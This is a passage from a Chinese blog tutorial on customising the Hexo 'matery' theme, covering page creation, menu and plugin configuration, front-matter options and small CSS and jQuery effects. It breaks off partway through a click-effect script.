`/source/about/index.md`，至少需要以下内容：\n\n&lt;pre&gt;`---\ntitle: about\ndate: 2018-09-30 17:25:30\ntype: &quot;about&quot;\nlayout: &quot;about&quot;\n---`&lt;/pre&gt;\n\n## [](#新建留言板-contact-页 &quot;新建留言板 contact 页&quot;)新建留言板 contact 页\n\n效果：\n\n![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814205915.png)\n\n`contact` 页是用来展示**留言板**信息的页面，如果在你的博客 `source` 目录下还没有 `contact/index.md` 文件，那么你就需要新建一个，命令如下：\n\n&lt;pre&gt;`hexo new page &quot;contact&quot;`&lt;/pre&gt;\n\n编辑你刚刚新建的页面文件 `/source/contact/index.md`，至少需要以下内容：\n\n&lt;pre&gt;`---\ntitle: contact\ndate: 2018-09-30 17:25:30\ntype: &quot;contact&quot;\nlayout: &quot;contact&quot;\n---`&lt;/pre&gt;\n\n## [](#新建友情链接-friends-页 &quot;新建友情链接 friends 页&quot;)新建友情链接 friends 页\n\n`friends` 页是用来展示**友情链接**信息的页面，如果在你的博客 `source` 目录下还没有 `friends/index.md` 文件，那么你就需要新建一个，命令如下：\n\n&lt;pre&gt;`hexo new page &quot;friends&quot;`&lt;/pre&gt;\n\n编辑你刚刚新建的页面文件 `/source/friends/index.md`，至少需要以下内容：\n\n&lt;pre&gt;`---\ntitle: friends\ndate: 2018-12-12 21:25:30\ntype: &quot;friends&quot;\nlayout: &quot;friends&quot;\n---`&lt;/pre&gt;\n\n同时，在你的博客 `source` 目录下新建 `_data` 目录，在 `_data` 目录中新建 `friends.json` 文件，\n\n![image-20200814202349576](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814202349.png)\n\n文件内容如下所示：\n\n&lt;pre&gt;`[&#123;\n    &quot;avatar&quot;: &quot;https://s1.ax1x.com/2020/06/23/NUr8pQ.jpg&quot;,\n    &quot;name&quot;: &quot;kif&quot;,\n    &quot;introduction&quot;: &quot;就是本人啦！&quot;,\n    &quot;url&quot;: &quot;https://kifroom.icu/&quot;,\n    &quot;title&quot;: &quot;前去学习&quot;\n&#125;, &#123;\n    &quot;avatar&quot;: &quot;头像地址&quot;,\n    &quot;name&quot;: &quot;名字&quot;,\n    &quot;introduction&quot;: &quot;介绍&quot;,\n    &quot;url&quot;: &quot;网址&quot;,\n    &quot;title&quot;: &quot;前去学习&quot;\n&#125;]`&lt;/pre&gt;\n\n后期添加就在这儿添加就可以了\n\n### [](#友链信息声明： &quot;友链信息声明：&quot;)友链信息声明：\n\n效果：\n\n![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814212249.png)\n\n`/source/friends/index.md`文件内填写即可\n\n## [](#新建-404-页 &quot;新建 404 页&quot;)新建 404 页\n\n如果在你的博客 `source` 目录下还没有 `404.md` 文件，那么你就需要新建一个\n\n编辑你刚刚新建的页面文件 `/source/404.md`，至少需要以下内容：\n\n&lt;pre&gt;`---\ntitle: 404\ndate: 2018-09-30 17:25:30\ntype: &quot;404&quot;\nlayout: &quot;404&quot;\ndescription: &quot;Oops～，我崩溃了！找不到你想要的页面 :(&quot;\n---`&lt;/pre&gt;\n\n这是默认的404，之后会介绍加入不受主题渲染的网页，届时可以自己写喜欢的404网页\n\n效果：\n\n![](https://cdn.jsdelivr.net/gh/wkif/ImageHosting/img/20200814205755.png)\n\n## [](#菜单导航配置 &quot;菜单导航配置&quot;)菜单导航配置\n\n### [](#配置基本菜单导航的名称、路径url和图标icon &quot;配置基本菜单导航的名称、路径url和图标icon.&quot;)配置基本菜单导航的名称、路径url和图标icon.\n\n1.菜单导航名称可以是中文也可以是英文(如：`Index`或`主页`) \n\n2.图标icon 可以在[Font Awesome](https://fontawesome.com/icons) 中查找\n\n&lt;pre&gt;`menu:\n  Index:\n    url: /\n    icon: fas fa-home\n  Tags:\n    url: /tags\n    icon: fas fa-tags\n  Categories:\n    url: /categories\n    icon: fas fa-bookmark\n  Archives:\n    url: /archives\n    icon: fas fa-archive\n  About:\n    url: /about\n    icon: fas fa-user-circle\n  Friends:\n    url: /friends\n    icon: fas fa-address-book`&lt;/pre&gt;\n\n### [](#二级菜单配置方法 &quot;二级菜单配置方法&quot;)二级菜单配置方法\n\n如果你需要二级菜单则可以在原基本菜单导航的基础上如下操作\n1.在需要添加二级菜单的一级菜单下添加`children`关键字(如:`About`菜单下添加`children`)\n2.在`children`下创建二级菜单的 名称name,路径url和图标icon.\n3.注意每个二级菜单模块前要加 `-`.\n4.注意缩进格式\n\n&lt;pre&gt;`menu:\n  Index:\n    url: /\n    icon: fas fa-home\n  Tags:\n    url: /tags\n    icon: fas fa-tags\n  Categories:\n    url: /categories\n    icon: fas fa-bookmark\n  Archives:\n    url: /archives\n    icon: fas fa-archive\n  About:\n    url: /about\n    icon: fas fa-user-circle-o\n  Friends:\n    url: /friends\n    icon: fas fa-address-book\n  Medias:\n    icon: fas fa-list\n    children:\n      - name: Musics\n        url: /musics\n        icon: fas fa-music\n      - name: Movies\n        url: /movies\n        icon: fas fa-film\n      - name: Books\n        url: /books\n        icon: fas fa-book\n      - name: Galleries\n        url: /galleries\n        icon: fas fa-image`&lt;/pre&gt;\n\n执行 `hexo clean &amp;amp;&amp;amp; hexo g` 重新生成博客文件，然后就可以在文章中对应位置看到你用`emoji`语法写的表情了。\n\n## [](#配置gitalk评论 &quot;配置gitalk评论&quot;)配置gitalk评论\n\n效果：\n\n![](https://cdn.jsdelivr.net/gh/wkif/ImageHosting/img/20200814205633.png)\n\n教程：[个人博客搭建（2）:配置gitalk评论](https://kifroom.icu/posts/4.html)\n\n## [](#代码高亮 &quot;代码高亮&quot;)代码高亮\n\n由于 Hexo 自带的代码高亮主题显示不好看，所以主题中使用到了 [hexo-prism-plugin](https://github.com/ele828/hexo-prism-plugin) 的 Hexo 插件来做代码高亮，安装命令如下：\n\n&lt;pre&gt;`npm i -S hexo-prism-plugin`&lt;/pre&gt;\n\n然后，修改 Hexo 根目录下 `_config.yml` 文件中 `highlight.enable` 的值为 `false`，并新增 `prism` 插件相关的配置，主要配置如下：\n\n&lt;pre&gt;`highlight:\n  enable: false\n\nprism_plugin:\n  mode: &#39;preprocess&#39;    # realtime/preprocess\n  theme: &#39;tomorrow&#39;\n  line_number: false    # default false\n  custom_css:`&lt;/pre&gt;\n\n## [](#搜索 &quot;搜索&quot;)搜索\n\n效果：\n\n![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814210129.png)\n\n本主题中还使用到了 [hexo-generator-search](https://github.com/wzpan/hexo-generator-search) 的 Hexo 插件来做内容搜索，安装命令如下：\n\n&lt;pre&gt;`npm install hexo-generator-search --save`&lt;/pre&gt;\n\n在 Hexo 根目录下的 `_config.yml` 文件中，新增以下的配置项：\n\n&lt;pre&gt;`search:\n  path: search.xml\n  field: post`&lt;/pre&gt;\n\n## [](#中文链接转拼音（建议安装） &quot;中文链接转拼音（建议安装）&quot;)中文链接转拼音（建议安装）\n\n如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 `SEO`，且 `gitment` 评论对中文链接也不支持。我们可以用 [hexo-permalink-pinyin](https://github.com/viko16/hexo-permalink-pinyin) Hexo 插件使在生成文章时生成中文拼音的永久链接。\n\n安装命令如下：\n\n&lt;pre&gt;`npm i hexo-permalink-pinyin --save`&lt;/pre&gt;\n\n在 Hexo 根目录下的 `_config.yml` 文件中，新增以下的配置项：\n\n&lt;pre&gt;`permalink_pinyin:\n  enable: true\n  separator: &#39;-&#39; # default: &#39;-&#39;`&lt;/pre&gt;&gt; **注**：除了此插件外，[hexo-abbrlink](https://github.com/rozbo/hexo-abbrlink) 插件也可以生成非中文的链接。\n\n## [](#文章字数统计插件（建议安装） &quot;文章字数统计插件（建议安装）&quot;)文章字数统计插件（建议安装）\n\n效果：\n\n![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814210200.png)\n\n如果你想要在文章中显示文章字数、阅读时长信息，可以安装 [hexo-wordcount](https://github.com/willin/hexo-wordcount)插件。\n\n安装命令如下：\n\n&lt;pre&gt;`npm i --save hexo-wordcount`&lt;/pre&gt;\n\n然后只需在本主题下的 `_config.yml` 文件中，将各个文章字数相关的配置激活即可：\n\n&lt;pre&gt;`postInfo:\n  date: true\n  update: false\n  wordCount: false # 设置文章字数统计为 true.\n  totalCount: false # 设置站点文章总字数统计为 true.\n  min2read: false # 阅读时长.\n  readCount: false # 阅读次数.`&lt;/pre&gt;\n\n## [](#添加emoji表情支持（可选的） &quot;添加emoji表情支持（可选的）&quot;)添加emoji表情支持（可选的）\n\n本主题新增了对`emoji`表情的支持，使用到了 [hexo-filter-github-emojis](https://npm.taobao.org/package/hexo-filter-github-emojis) 的 Hexo 插件来支持 `emoji`表情的生成，把对应的`markdown emoji`语法（`::`,例如：`:smile:`）转变成会跳跃的`emoji`表情，安装命令如下：\n\n&lt;pre&gt;`npm install hexo-filter-github-emojis --save`&lt;/pre&gt;\n\n在 Hexo 根目录下的 `_config.yml` 文件中，新增以下的配置项：\n\n&lt;pre&gt;`githubEmojis:\n  enable: true\n  className: github-emoji\n  inject: true\n  styles:\n  customEmojis:`&lt;/pre&gt;\n\n## [](#添加-RSS-订阅支持（可选的） &quot;添加 RSS 订阅支持（可选的）&quot;)添加 RSS 订阅支持（可选的）\n\n本主题中还使用到了 [hexo-generator-feed](https://github.com/hexojs/hexo-generator-feed) 的 Hexo 插件来做 `RSS`，安装命令如下：\n\n&lt;pre&gt;`npm install hexo-generator-feed --save`&lt;/pre&gt;\n\n在 Hexo 根目录下的 `_config.yml` 文件中，新增以下的配置项：\n\n&lt;pre&gt;`feed:\n  type: atom\n  path: atom.xml\n  limit: 20\n  hub:\n  content:\n  content_limit: 140\n  content_limit_delim: &#39; &#39;\n  order_by: -date`&lt;/pre&gt;\n\n执行 `hexo clean &amp;amp;&amp;amp; hexo g` 重新生成博客文件，然后在 `public` 文件夹中即可看到 `atom.xml` 文件，说明你已经安装成功了。\n\n## [](#添加-DaoVoice-在线聊天功能（可选的） &quot;添加 DaoVoice 在线聊天功能（可选的）&quot;)添加 [DaoVoice](http://www.daovoice.io/) 在线聊天功能（可选的）\n\n前往 [DaoVoice](http://www.daovoice.io/) 官网注册并且获取 `app_id`，并将 `app_id` 填入主题的 `_config.yml` 文件中。\n\n## [](#添加-Tidio-在线聊天功能（可选的） &quot;添加 Tidio 在线聊天功能（可选的）&quot;)添加 [Tidio](https://www.tidio.com/) 在线聊天功能（可选的）\n\n前往 [Tidio](https://www.tidio.com/) 官网注册并且获取 `Public Key`，并将 `Public Key` 填入主题的 `_config.yml` 文件中。\n\n## [](#修改页脚 &quot;修改页脚&quot;)修改页脚\n\n效果：\n\n![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814210231.png)\n\n页脚信息可能需要做定制化修改，而且它不便于做成配置信息，所以可能需要你自己去再修改和加工。修改的地方在主题文件的 `/layout/_partial/footer.ejs` 文件中，包括站点、使用的主题、访问量等。\n\n## [](#修改社交链接 &quot;修改社交链接&quot;)修改社交链接\n\n在主题的 `_config.yml` 文件中，默认支持 `QQ`、`GitHub` 和邮箱等的配置，你可以在主题文件的 `/layout/_partial/social-link.ejs` 文件中，新增、修改你需要的社交链接地址，增加链接可参考如下代码：\n\n&lt;pre&gt;`&amp;lt;% if (theme.socialLink.github) &#123; %&amp;gt;\n    &amp;lt;a href=&quot;&amp;lt;%= theme.socialLink.github %&amp;gt;&quot; class=&quot;tooltipped&quot; target=&quot;_blank&quot; data-tooltip=&quot;访问我的GitHub&quot; data-position=&quot;top&quot; data-delay=&quot;50&quot;&amp;gt;\n        &amp;lt;i class=&quot;fab fa-github&quot;&amp;gt;&amp;lt;/i&amp;gt;\n    &amp;lt;/a&amp;gt;\n&amp;lt;% &#125; %&amp;gt;`&lt;/pre&gt;\n\n其中，社交图标（如：`fa-github`）你可以在 [Font Awesome](https://fontawesome.com/icons) 中搜索找到。以下是常用社交图标的标识，供你参考：\n\n\nFacebook: fab fa-facebook\n\nTwitter: fab fa-twitter\n\nGoogle-plus: fab fa-google-plus\n\nLinkedin: fab fa-linkedin\n\nTumblr: fab fa-tumblr\n\nMedium: fab fa-medium\n\nSlack: fab fa-slack\n\nSina Weibo: fab fa-weibo\n\nWechat: fab fa-weixin\n\nQQ: fab fa-qq\n\nZhihu: fab fa-zhihu\n\n\n\n\n\n\n\n\n\n注意: 本主题中使用的 Font Awesome 版本为 5.11.0。\n修改打赏的二维码图片效果：\n\n在主题文件的 source/medias/reward 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片。\n配置音乐播放器（可选的）效果：\n\n要支持音乐播放，在主题的 _config.yml 配置文件中激活music配置即可：\n`# 是否在首页显示音乐\nmusic:\n  enable: true\n  title:             # 非吸底模式有效\n    enable: true\n    show: 听听音乐\n  server: netease   # require music platform: netease, tencent, kugou, xiami, baidu\n  type: playlist    # require song, playlist, album, search, artist\n  id: 503838841     # require song id / playlist id / album id / search keyword\n  fixed: false      # 开启吸底模式\n  autoplay: false   # 是否自动播放\n  theme: '#42b983'\n  loop: 'all'       # 音频循环播放, 可选值: 'all', 'one', 'none'\n  order: 'random'   # 音频循环顺序, 可选值: 'list', 'random'\n  preload: 'auto'   # 预加载，可选值: 'none', 'metadata', 'auto'\n  volume: 0.7       # 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效\n  listFolded: true  # 列表默认折叠`> `server`可选`netease`（网易云音乐），`tencent`（QQ音乐），`kugou`（酷狗音乐），`xiami`（虾米音乐），\n\n\n\n\n\n\n\n\n\n\n`baidu`（百度音乐）。\n\n`type`可选`song`（歌曲），`playlist`（歌单），`album`（专辑），`search`（搜索关键字），`artist`（歌手）\n\n&lt;pre&gt;`id`获取方法示例: 浏览器打开网易云音乐，点击我喜欢的音乐歌单，浏览器地址栏后面会有一串数字，`playlist`的`id`&lt;/pre&gt;\n\n即为这串数字。\n\n## [](#文章-Front-matter-介绍 &quot;文章 Front-matter 介绍&quot;)文章 Front-matter 介绍\n\n### [](#Front-matter-选项详解 &quot;Front-matter 选项详解&quot;)Front-matter 选项详解\n\n`Front-matter` 选项中的所有内容均为**非必填**的。但我仍然建议至少填写 `title` 和 `date` 的值。\n\n&lt;table&gt;\n&lt;thead&gt;\n&lt;tr&gt;\n&lt;th&gt;配置选项&lt;/th&gt;\n&lt;th&gt;默认值&lt;/th&gt;\n&lt;th&gt;描述&lt;/th&gt;\n&lt;/tr&gt;\n&lt;/thead&gt;\n&lt;tbody&gt;&lt;tr&gt;\n&lt;td&gt;title&lt;/td&gt;\n&lt;td&gt;`Markdown` 的文件标题&lt;/td&gt;\n&lt;td&gt;文章标题，强烈建议填写此选项&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;date&lt;/td&gt;\n&lt;td&gt;文件创建时的日期时间&lt;/td&gt;\n&lt;td&gt;发布时间，强烈建议填写此选项，且最好保证全局唯一&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;author&lt;/td&gt;\n&lt;td&gt;根 `_config.yml` 中的 `author`&lt;/td&gt;\n&lt;td&gt;文章作者&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;img&lt;/td&gt;\n&lt;td&gt;`featureImages` 中的某个值&lt;/td&gt;\n&lt;td&gt;文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: `http://xxx.com/xxx.jpg`&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;top&lt;/td&gt;\n&lt;td&gt;`true`&lt;/td&gt;\n&lt;td&gt;推荐文章（文章是否置顶），如果 `top` 值为 `true`，则会作为首页推荐文章&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;cover&lt;/td&gt;\n&lt;td&gt;`false`&lt;/td&gt;\n&lt;td&gt;`v1.0.2`版本新增，表示该文章是否需要加入到首页轮播封面中&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;coverImg&lt;/td&gt;\n&lt;td&gt;无&lt;/td&gt;\n&lt;td&gt;`v1.0.2`版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;password&lt;/td&gt;\n&lt;td&gt;无&lt;/td&gt;\n&lt;td&gt;文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 `password` 的值，该值必须是用 `SHA256` 加密后的密码，防止被他人识破。前提是在主题的 `config.yml` 中激活了 `verifyPassword` 选项&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;toc&lt;/td&gt;\n&lt;td&gt;`true`&lt;/td&gt;\n&lt;td&gt;是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 `config.yml` 中激活了 `toc` 选项&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;mathjax&lt;/td&gt;\n&lt;td&gt;`false`&lt;/td&gt;\n&lt;td&gt;是否开启数学公式支持 ，本文章是否开启 `mathjax`，且需要在主题的 `_config.yml` 文件中也需要开启才行&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;summary&lt;/td&gt;\n&lt;td&gt;无&lt;/td&gt;\n&lt;td&gt;文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;categories&lt;/td&gt;\n&lt;td&gt;无&lt;/td&gt;\n&lt;td&gt;文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;tags&lt;/td&gt;\n&lt;td&gt;无&lt;/td&gt;\n&lt;td&gt;文章标签，一篇文章可以多个标签&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;keywords&lt;/td&gt;\n&lt;td&gt;文章标题&lt;/td&gt;\n&lt;td&gt;文章关键字，SEO 时需要&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;reprintPolicy&lt;/td&gt;\n&lt;td&gt;cc_by&lt;/td&gt;\n&lt;td&gt;文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/tbody&gt;&lt;/table&gt;\n&gt; **注意**:\n\n\n\n\n\n\n\n\n\n\n\n如果 img 属性不填写的话，文章特色图会根据文章标题的 hashcode 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图各有特色。\ndate 的值尽量保证每篇文章是唯一的，因为本主题中 Gitalk 和 Gitment 识别 id 是通过 date 的值来作为唯一标识的。\n如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 _config.yml 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：开源中国在线工具、chahuo、站长工具。\n您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则\n\n以下为文章的 `Front-matter` 示例。\n\n### [](#最简示例 &quot;最简示例&quot;)最简示例\n&lt;pre&gt;`---\ntitle: typora-vue-theme主题介绍\ndate: 2018-09-07 09:25:00\n---`&lt;/pre&gt;\n\n### [](#最全示例 &quot;最全示例&quot;)最全示例\n&lt;pre&gt;`---\ntitle: typora-vue-theme主题介绍\ndate: 2020-09-07 09:25:00\nauthor: kif\nimg: /source/images/xxx.jpg\ntop: true\ncover: true\ncoverImg: /images/1.jpg\npassword: 123456\ntoc: false\nmathjax: false\nsummary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要\ncategories: Markdown\ntags:\n  - Typora\n  - Markdown\n---`&lt;/pre&gt;\n\n## [](#页尾鱼塘效果美化 &quot;页尾鱼塘效果美化&quot;)页尾鱼塘效果美化\n\n效果：\n\n![1](https://cdn.jsdelivr.net/gh/wkif/ImageHosting/img/20200814204700.gif)\n\n教程：[个人博客搭建：网页页尾鱼塘效果美化](https://kifroom.icu/posts/63210.html)\n\n## [](#修改导航栏颜色以及透明效果 &quot;修改导航栏颜色以及透明效果&quot;)修改导航栏颜色以及透明效果\n\n效果：\n\n![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814210442.png)\n\n打开`themes/matery/source/css/matery.css`文件，大约在250行，有一个`.bg-color`属性，修改其属性值即可，代码如下：\n\n&lt;pre class=&quot;line-numbers language-css&quot;&gt;`&lt;span class=&quot;token selector&quot;&gt;&lt;span class=&quot;token class&quot;&gt;.bg-color&lt;/span&gt; &lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&#123;&lt;/span&gt;\n    &lt;span class=&quot;token property&quot;&gt;background-image&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;linear-gradient&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;to right, &lt;span class=&quot;token hexcode&quot;&gt;#4cbf30&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0%&lt;/span&gt;, &lt;span class=&quot;token hexcode&quot;&gt;#0f9d58&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;100%&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; //修改成自己喜欢的颜色值\n    &lt;span class=&quot;token property&quot;&gt;opacity&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0.8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  //透明效果 值范围 &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;~&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;，看情况自己修改\n&lt;span class=&quot;token punctuation&quot;&gt;&#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt;\n\n## [](#鼠标点击文字特效 &quot;鼠标点击文字特效&quot;)鼠标点击文字特效\n\n实现方法，引入js文件，在主题文件下的`/source/js/`下新建`click_show_text.js`，其代码如下：\n\n&lt;pre class=&quot;line-numbers language-javascript&quot;&gt;`&lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; a_idx &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;\n&lt;span class=&quot;token function&quot;&gt;jQuery&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;document&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;ready&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;$&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&#123;&lt;/span&gt;\n    &lt;span class=&quot;token function&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;body&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;click&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&#123;&lt;/span&gt;\n        &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; a &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;富强&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;民主&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;文明&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;和谐&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;自由&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;平等&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;公正&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;法治&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;爱国&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;敬业&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;诚信&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;友善&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;\n        &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; $i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&amp;lt;span/&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;a_idx&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;\n        a_idx &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a_idx &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; a&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;length&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;\n        &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; x &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pageX&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;\n            y &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pageY&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;\n        $i&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;css&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&#123;&lt;/span&gt;\n            &lt;span class=&quot;token string&quot;&gt;&quot;z-index&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;\n            &lt;span class=&quot;token string&quot;&gt;&quot;top&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; y &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;\n            &lt;span class=&quot;token 